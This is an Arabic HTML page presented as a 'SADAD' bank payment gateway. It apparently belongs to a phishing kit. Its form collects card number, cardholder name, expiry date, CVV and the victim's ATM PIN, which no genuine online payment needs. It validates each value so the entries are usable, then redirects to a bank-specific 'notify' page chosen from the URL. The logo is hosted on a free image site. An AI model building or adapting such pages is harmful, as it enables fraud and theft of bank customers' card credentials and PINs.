<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة سداد - تفاصيل الدفع</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; direction: rtl; }
        .header { text-align: center; margin-bottom: 20px; }
        .header img { height: 60px; }
        .breadcrumb { text-align: center; color: green; font-size: 14px; margin-bottom: 20px; }
        .payment-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
        h2 { text-align: center; color: green; font-size: 22px; margin-bottom: 10px; }
        p { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
        
        .form-group { margin-bottom: 18px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
        
        .input-wrapper { position: relative; }
        input { 
            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; 
            font-size: 16px; box-sizing: border-box; outline: none;
            transition: border-color 0.3s;
        }
        input[type="text"]:not(#cardNumber):not(#expiryDate) { direction: rtl; text-align: right; }
        input[type="text"]#cardNumber, input[type="text"]#expiryDate { direction: ltr; text-align: left; }
        input[type="password"] { direction: ltr; text-align: left; }
        input:focus { border-color: green; box-shadow: 0 0 5px rgba(0,128,0,0.2); }
        input.error { border-color: #d32f2f; background-color: #ffebee; }
        input.success { border-color: #2e7d32; background-color: #f1f8e9; }
        
        .error-message { 
            display: none; color: #d32f2f; font-size: 12px; margin-top: 5px; 
            font-weight: bold;
        }
        .error-message.show { display: block; }
        
        .success-icon { 
            position: absolute; left: 12px; top: 38px; color: #2e7d32; 
            font-size: 18px; display: none;
        }
        .success-icon.show { display: block; }
        
        .row { display: flex; gap: 15px; }
        .row .form-group { flex: 1; }
        
        .pay-btn { 
            width: 100%; background: green; color: white; border: none; padding: 14px; 
            border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; 
            transition: 0.3s; margin-top: 10px;
        }
        .pay-btn:hover:not(:disabled) { background: darkgreen; transform: translateY(-2px); }
        .pay-btn:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد">
    </div>
    <div class="breadcrumb">الرئيسية / شخصي / اختر البنك / تفاصيل الدفع</div>
    
    <div class="payment-container">
        <h2>إدخال تفاصيل البطاقة</h2>
        
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">رقم البطاقة</label>
                <div class="input-wrapper">
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                    <span class="success-icon">✓</span>
                </div>
                <div class="error-message" id="cardError"></div>
            </div>

            <div class="form-group">
                <label for="cardholderName">الاسم كما هو مسجل على البطاقة</label>
                <div class="input-wrapper">
                    <input type="text" id="cardholderName" required>
                    <span class="success-icon">✓</span>
                </div>
                <div class="error-message" id="nameError"></div>
            </div>
            
            <div class="row">
                <div class="form-group">
                    <label for="expiryDate">تاريخ الانتهاء</label>
                    <div class="input-wrapper">
                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
                        <span class="success-icon">✓</span>
                    </div>
                    <div class="error-message" id="expiryError"></div>
                </div>
                <div class="form-group">
                    <label for="cvv">رمز التحقق (CVV)</label>
                    <div class="input-wrapper">
                        <input type="password" id="cvv" placeholder="123" maxlength="3" required>
                        <span class="success-icon">✓</span>
                    </div>
                    <div class="error-message" id="cvvError"></div>
                </div>
            </div>

            <div class="form-group">
                <label for="atmPin">رقم الصراف الآلي (PIN)</label>
                <div class="input-wrapper">
                    <input type="password" id="atmPin" placeholder="****" maxlength="4" required>
                    <span class="success-icon">✓</span>
                </div>
                <div class="error-message" id="pinError"></div>
            </div>

            <button type="submit" class="pay-btn" id="submitBtn" disabled>تأكيد الدفع</button>
        </form>
    </div>

    <script>
        // ===== VALIDATION FUNCTIONS =====
        
        // Luhn Algorithm for card validation
        function luhnCheck(num) {
            let sum = 0;
            let isEven = false;
            for (let i = num.length - 1; i >= 0; i--) {
                let digit = parseInt(num[i], 10);
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                isEven = !isEven;
            }
            return sum % 10 === 0;
        }

        // Validate Card Number
        function validateCardNumber(value) {
            const cardNum = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            if (cardNum.length !== 16) {
                return { valid: false, message: 'رقم البطاقة يجب أن يكون 16 رقماً' };
            }
            if (!luhnCheck(cardNum)) {
                return { valid: false, message: 'رقم البطاقة غير صحيح' };
            }
            return { valid: true, message: '' };
        }

        // Validate Cardholder Name
        function validateCardholderName(value) {
            if (!value || value.trim().length === 0) {
                return { valid: false, message: 'الاسم مطلوب' };
            }
            if (value.trim().length < 3) {
                return { valid: false, message: 'الاسم يجب أن يكون 3 أحرف على الأقل' };
            }
            if (!/^[\u0600-\u06FF\s\-a-zA-Z]+$/.test(value)) {
                return { valid: false, message: 'الاسم يجب أن يحتوي على أحرف فقط' };
            }
            return { valid: true, message: '' };
        }

        // Validate Expiry Date
        function validateExpiryDate(value) {
            const parts = value.split('/');
            if (parts.length !== 2) {
                return { valid: false, message: 'الصيغة: MM/YY' };
            }
            const month = parseInt(parts[0], 10);
            const year = parseInt(parts[1], 10);
            
            if (isNaN(month) || isNaN(year)) {
                return { valid: false, message: 'أدخل أرقاماً صحيحة' };
            }
            if (month < 1 || month > 12) {
                return { valid: false, message: 'الشهر يجب أن يكون من 01 إلى 12' };
            }
            
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear() % 100;
            const currentMonth = currentDate.getMonth() + 1;
            
            if (year < currentYear || (year === currentYear && month < currentMonth)) {
                return { valid: false, message: 'البطاقة منتهية الصلاحية' };
            }
            
            return { valid: true, message: '' };
        }

        // Validate CVV
        function validateCVV(value) {
            if (!/^\d{3}$/.test(value)) {
                return { valid: false, message: 'رمز التحقق يجب أن يكون 3 أرقام' };
            }
            return { valid: true, message: '' };
        }

        // Validate PIN
        function validatePIN(value) {
            if (!/^\d{4}$/.test(value)) {
                return { valid: false, message: 'رقم الصراف يجب أن يكون 4 أرقام' };
            }
            return { valid: true, message: '' };
        }

        // ===== INPUT FORMATTING =====
        
        // Format Card Number
        document.getElementById('cardNumber').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = "";
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += " ";
                formatted += value[i];
            }
            e.target.value = formatted;
            validateField('cardNumber');
        });

        // Validate Cardholder Name
        document.getElementById('cardholderName').addEventListener('input', function (e) {
            validateField('cardholderName');
        });

        // Format Expiry Date
        document.getElementById('expiryDate').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
            if (value.length > 2) {
                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
            } else {
                e.target.value = value;
            }
            validateField('expiryDate');
        });

        // Validate CVV
        document.getElementById('cvv').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^0-9]/gi, '').substring(0, 3);
            validateField('cvv');
        });

        // Validate PIN
        document.getElementById('atmPin').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^0-9]/gi, '').substring(0, 4);
            validateField('atmPin');
        });

        // ===== FIELD VALIDATION =====
        
        function validateField(fieldId) {
            const field = document.getElementById(fieldId);
            const errorMsg = document.getElementById(fieldId + 'Error');
            const successIcon = field.parentElement.querySelector('.success-icon');
            let result;

            switch (fieldId) {
                case 'cardNumber':
                    result = validateCardNumber(field.value);
                    break;
                case 'cardholderName':
                    result = validateCardholderName(field.value);
                    break;
                case 'expiryDate':
                    result = validateExpiryDate(field.value);
                    break;
                case 'cvv':
                    result = validateCVV(field.value);
                    break;
                case 'atmPin':
                    result = validatePIN(field.value);
                    break;
            }

            if (result.valid) {
                field.classList.remove('error');
                field.classList.add('success');
                errorMsg.classList.remove('show');
                successIcon.classList.add('show');
            } else {
                field.classList.remove('success');
                field.classList.add('error');
                errorMsg.textContent = result.message;
                errorMsg.classList.add('show');
                successIcon.classList.remove('show');
            }

            checkFormValidity();
        }

        // ===== FORM VALIDITY CHECK =====
        
        function checkFormValidity() {
            const cardNum = document.getElementById('cardNumber');
            const cardName = document.getElementById('cardholderName');
            const expiry = document.getElementById('expiryDate');
            const cvv = document.getElementById('cvv');
            const pin = document.getElementById('atmPin');
            const submitBtn = document.getElementById('submitBtn');

            const isCardValid = validateCardNumber(cardNum.value).valid;
            const isNameValid = validateCardholderName(cardName.value).valid;
            const isExpiryValid = validateExpiryDate(expiry.value).valid;
            const isCVVValid = validateCVV(cvv.value).valid;
            const isPINValid = validatePIN(pin.value).valid;

            submitBtn.disabled = !(isCardValid && isNameValid && isExpiryValid && isCVVValid && isPINValid);
        }

        // ===== FORM SUBMISSION =====
        
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Final validation
            const cardNum = document.getElementById('cardNumber');
            const cardName = document.getElementById('cardholderName');
            const expiry = document.getElementById('expiryDate');
            const cvv = document.getElementById('cvv');
            const pin = document.getElementById('atmPin');

            if (!validateCardNumber(cardNum.value).valid ||
                !validateCardholderName(cardName.value).valid ||
                !validateExpiryDate(expiry.value).valid ||
                !validateCVV(cvv.value).valid ||
                !validatePIN(pin.value).valid) {
                alert('يرجى التحقق من جميع البيانات المدخلة');
                return;
            }

            // Get bank from URL
            const urlParams = new URLSearchParams(window.location.search);
            const bank = urlParams.get('bank') || 'qnb';
            
            // Redirect to success notification
            window.location.href = `notify_${bank}.html`;
        });
    </script>
</body>
</html>
